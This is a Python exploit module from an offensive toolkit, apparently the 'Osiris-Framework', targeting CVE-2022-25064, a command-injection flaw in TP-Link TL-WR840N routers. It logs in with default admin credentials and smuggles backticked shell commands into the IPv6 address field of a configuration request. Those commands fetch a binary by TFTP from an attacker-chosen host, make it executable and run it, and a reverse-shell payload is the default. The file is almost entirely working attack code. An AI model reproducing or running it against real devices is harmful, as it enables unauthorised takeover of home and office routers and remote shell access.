#!/usr/bin/env python3
# Project: Osiris-Framework
# Version 1.337
import requests

from core.ModuleObtainer import obtainer
from core.Processor import processor
from core.generator.Generator import generator
from core.generator.Ofuscator import ofuscator
from utilities.Tools import tools
from requests import post
from utilities.Messages import print_message

print_message.name_module = __file__

info = {
    'author': 'Samir Sanchez Garnica and Luis Jacome Valencia',
    'date': '12/10/2021',
    'rank': 'Excellent',
    'category': 'Exploit',
    'path': 'exploits/linux/misc/tplink/tl_wr840n/os_command_injection_cve_2022_25064.py',
    'license': 'GPL-2.0',
    'description': 'This vulnerability is discovered under the libcmm.so library, which processes parameters that are sent from the web server. '
                   'Although these parameters are validated only under a request size of size 40 for the case of the X_TP_ExternalIPv6Address argument, '
                   'at the character level there is no real validation filter in compliance with the input of a real ipv6 address, which allows a command injection.',
    'references': ['https://exploitwriter.io/2022/02/25/os-command-injection-in-tplink-tl-wr840n-cve-2022-25064/','https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25064']
}
options = {
    'target': ['Yes', 'set target to attack', ''],
    'platform': ['Yes', 'set id target to attack', '0'],
    'srvhost': ['Yes', 'Sets the TFTP server with the binary to be injected', ''],
    'srvfile': ['Yes', 'Sets the file name to inject ', ''],
    'payload': ['Yes', 'Set payload attack software', 'cmd/generic/reverse_tcp'],
    'username': ['Yes', 'Sets the username for authentication', 'admin'],
    'password': ['Yes', 'Sets the password for authentication', 'admin']
}

extra_info = {
    'cve': ['CVE-2022-25064'],
    'targets': ['GNU/Linux']
}

required = {
    'start_required': 'True',
    'check_required': 'False'
}


def exploit():
    try:
        print_message.start_execution()
        __target = tools.http_or_https(obtainer.options['target'][2])
        __session = requests.Session()

        if __target['code'] == 200:
            __headers = {
                'Host': obtainer.options['target'][2].split("//")[1].split('/')[0],
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0',
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'text/plain',
                'Content-Length': 'str(len(self.payload))',
                'Origin': obtainer.options['target'][2],
                'Referer': obtainer.options['target'][2] + '/mainFrame.htm',
            }

            __cookies = {'Authorization': 'Basic ' + ofuscator.base64_encode(obtainer.options['username'][2] + ":" + obtainer.options['password'][2])['message']}

            __url = obtainer.options['target'][2] + "/cgi?2&2"
            processor.multi_handler(payload_options=obtainer.options_payload,
                                    exploit_options=obtainer.options)

            for __command in ['tftp -g -r {} -l/var/tmp/{} {}'.format(obtainer.options['srvfile'][2],obtainer.options['srvfile'][2], obtainer.options['srvhost'][2]), 'chmod +x /var/tmp/{}'.format(obtainer.options['srvfile'][2]), '/var/tmp/{} &'.format(obtainer.options['srvfile'][2])]:
                print_message.execution_info("Sending  Stage: {}".format(__command))
                __payload = '[WAN_ETH_INTF#1,0,0,0,0,0#0,0,0,0,0,0]0,2\r\nX_TP_lastUsedIntf=ipoe_eth3_s\r\nX_TP_lastUsedName=ewan_ipoe_s\r\n[WAN_IP_CONN#1,1,1,0,0,0#0,0,0,0,0,0]1,18\r\nexternalIPAddress=172.26.26.2\r\nsubnetMask=255.255.255.0\r\ndefaultGateway=172.26.26.1\r\nNATEnabled=1\r\nX_TP_FullconeNATEnabled=0\r\nX_TP_FirewallEnabled=1\r\nmaxMTUSize=1500\r\nDNSOverrideAllowed=1\r\nDNSServers=1.1.1.1,8.8.8.8\r\nX_TP_IPv4Enabled=0\r\nX_TP_IPv6Enabled=1\r\nX_TP_IPv6AddressingType=Static\r\nX_TP_ExternalIPv6Address=`'+str(__command)+'`\r\nX_TP_PrefixLength=128\r\nX_TP_DefaultIPv6Gateway=::\r\nX_TP_IPv6DNSOverrideAllowed=1\r\nX_TP_IPv6DNSServers=::,::\r\nenable=1\r\n'

                try:
                    __response = __session.post(__url, headers=__headers, cookies=__cookies,
                                                  data=__payload, timeout=5)
                except requests.exceptions.Timeout:
                    pass


            print_message.end_execution()

        else:
            print_message.execution_error("The URL must be in the format http:// or https://")
            return False

    except Exception as Error:
        print(Error)


def check():
    pass